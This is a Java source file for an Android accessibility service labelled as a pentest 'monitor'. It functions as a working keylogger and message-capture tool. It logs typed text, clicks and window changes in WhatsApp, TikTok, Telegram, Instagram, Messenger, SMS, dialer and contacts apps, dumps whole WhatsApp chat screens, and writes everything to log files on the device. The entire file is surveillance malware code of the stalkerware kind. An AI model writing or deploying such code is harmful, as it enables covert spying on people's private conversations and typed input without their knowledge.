// MonitorAccessibilityService.java
package com.yourorg.pentest.monitor;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MonitorAccessibilityService extends AccessibilityService {

    private static final String TAG = "DeviceMonitor";
    private static final String LOG_FILE = "monitor_log.txt";
    private StringBuilder currentBuffer = new StringBuilder();
    private String lastPackage = "";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
        int eventType = event.getEventType();

        // Only log interesting packages
        if (!isTargetApp(packageName)) return;

        StringBuilder sb = new StringBuilder();
        String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.US)
                .format(new Date(event.getEventTime()));

        sb.append("[").append(timestamp).append("] ");
        sb.append("[").append(packageName).append("] ");

        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                // Catches text as user types (WhatsApp, TikTok, etc.)
                CharSequence text = event.getText() != null && event.getText().size() > 0
                        ? event.getText().get(0) : "";
                sb.append("TEXT_CHANGED: ").append(text);
                break;

            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                sb.append("CLICK: ").append(getViewId(event));
                break;

            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                sb.append("WINDOW_CHANGE: ").append(getActivityName(event));
                // Capture the full screen content for WhatsApp chats
                if (packageName.contains("whatsapp") || packageName.contains("com.whatsapp")) {
                    AccessibilityNodeInfo root = getRootInActiveWindow();
                    if (root != null) {
                        sb.append("\nSCREEN_DUMP:\n");
                        dumpNodeTree(root, sb, 0);
                        root.recycle();
                    }
                }
                break;

            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                sb.append("TEXT_SELECTION");
                break;

            default:
                return; // Skip uninteresting events
        }

        sb.append("\n");
        Log.d(TAG, sb.toString());
        appendToFile(sb.toString(), packageName);
    }

    private void dumpNodeTree(AccessibilityNodeInfo node, StringBuilder sb, int depth) {
        if (node == null) return;

        // Get text content - this is how we read WhatsApp messages
        CharSequence text = node.getText();
        CharSequence contentDescription = node.getContentDescription();
        String className = node.getClassName() != null ? node.getClassName().toString() : "";

        // Filter to only meaningful text nodes
        if ((text != null && text.length() > 0) ||
            (contentDescription != null && contentDescription.length() > 0)) {

            for (int i = 0; i < depth; i++) sb.append("  ");
            sb.append("[")
              .append(className.substring(className.lastIndexOf('.') + 1))
              .append("] ");
            if (text != null) sb.append("text=\"").append(text).append("\" ");
            if (contentDescription != null) sb.append("desc=\"").append(contentDescription).append("\" ");
            sb.append("\n");
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            dumpNodeTree(node.getChild(i), sb, depth + 1);
        }
    }

    private boolean isTargetApp(String packageName) {
        // Packages of interest - add more as needed
        return packageName != null && (
            packageName.contains("whatsapp") ||
            packageName.contains("com.whatsapp") ||
            packageName.contains("tiktok") ||
            packageName.contains("com.zhiliaoapp") ||
            packageName.contains("com.google.android.dialer") ||
            packageName.contains("com.android.contacts") ||
            packageName.contains("com.android.mms") ||
            packageName.contains("com.google.android.apps.messaging") ||
            packageName.contains("messenger") ||
            packageName.contains("telegram") ||
            packageName.contains("instagram")
        );
    }

    private String getViewId(AccessibilityEvent event) {
        return event.getSource() != null && event.getSource().getViewIdResourceName() != null
                ? event.getSource().getViewIdResourceName() : "unknown";
    }

    private String getActivityName(AccessibilityEvent event) {
        try {
            return event.getClassName() != null
                    ? event.getClassName().toString() : "unknown";
        } catch (Exception e) {
            return "unknown";
        }
    }

    private void appendToFile(String data, String packageName) {
        try {
            String dirName = packageName.replace('.', '_').replace('/', '_');
            File dir = new File(getExternalFilesDir(null), "monitor/" + dirName);
            dir.mkdirs();
            File file = new File(dir, LOG_FILE);
            FileWriter fw = new FileWriter(file, true);
            fw.append(data);
            fw.close();
        } catch (IOException e) {
            Log.e(TAG, "Write error", e);
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Service interrupted");
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Monitor service connected");
    }
}
